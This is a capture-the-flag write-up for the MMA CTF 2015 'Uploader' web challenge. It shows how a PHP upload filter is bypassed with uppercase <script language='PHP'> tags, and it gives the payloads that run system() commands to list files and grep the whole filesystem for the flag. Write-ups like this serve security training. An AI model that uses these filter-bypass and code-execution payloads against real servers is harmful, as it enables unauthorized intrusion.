[](ctf=mma-ctf-2015)
[](type=web)
[](tags=php,lfi,rce)
[](tools=)
[](techniques=)

# Uploader (web-100)

Website says 'You can upload any file!', and really lets us. But when uploading text files, it removes any '<?' or 'php' as mentioned in the problem. Obviously, this question is based on LFI+Remote Code Execution, we need to get our php running there somehow. First I tried uploading various variations of php hello world, like:

```php
<?php echo 'Hello world!';
```
```php
<? echo 'Hello world!';
```
```shell
#!/usr/bin/php -r
echo 'Hello world!';
```
Nothing seemed to work. Since '<?'s are being removed, I tried:
```php
<<?? echo 'Hello world!';
```
Still, no use.

Is it possible to run without <? tags?

After googling, we see from php manual page that, we can use these tags instead:
```php
<script language="php"> echo('Hello world!'); </script>
```
But after uploading, the word 'php' is removed, resulting in
```php
<script language=""> echo('Hello world!'); </script>
```
I was out of ideas. But after a long time, I realized that question only talks about removing 'php', but does it remove 'PHP' (uppercase) ? Let's find out:
```php
<script language="PHP"> echo('Hello world!'); </script>
```
Success! We got our php
 running, now we just have to look for the flag.

First, let me check a few variables
```php
<script language="PHP">
echo $flag;
print_r(get_defined_vars());
print_r(get_defined_constants());
</script>
```
Nope, nothing here. Let's look at some files:
```php
<script language="PHP">
system("ls");
</script>
```
Nothing useful here, let's do a full system search:
```php
<script language="PHP"> echo system("egrep -rnis 'MMA{' /"); </script>
```
Aaand we get our flag:

> MMA{you can run php from script tag}
